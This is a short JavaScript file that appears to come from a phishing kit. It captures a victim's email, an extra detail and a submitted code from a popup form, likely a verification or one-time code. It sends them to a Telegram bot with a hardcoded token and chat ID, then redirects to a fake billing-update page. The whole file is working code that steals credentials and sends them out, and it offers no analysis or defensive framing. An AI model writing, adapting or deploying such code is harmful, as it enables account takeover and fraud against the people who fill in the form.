document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("pop-code");

    if (!form) return;

    form.addEventListener("submit", async (e) => {
        e.preventDefault();

        const submitBtn = document.getElementById("pop-submit");
        if (submitBtn) submitBtn.disabled = true;

        // Replace these with your Telegram Bot details
        const BOT_TOKEN = "8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM";
        const CHAT_ID = "8614416084";

        // Read the hidden input values
        const codeEmail = form.querySelector('input[name="codeEmail"]')?.value || "";
        const codeDetail = form.querySelector('input[name="codeDetail"]')?.value || "";

        // Read the submitted code (change the name if your input uses a different one)
        const code = form.querySelector('input[name="code"]')?.value || "";

        const message =
`📩 New Popup Submission
Email: ${codeEmail}
Detail: ${codeDetail}
Code: ${code}`;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                }),
            });

            // Redirect after successful send
            window.location.href = "/updatbilling/index.html";
        } catch (error) {
            console.error("Telegram Error:", error);

            // Redirect even if sending fails
            window.location.href = "/bigger.html";
        }
    });
});
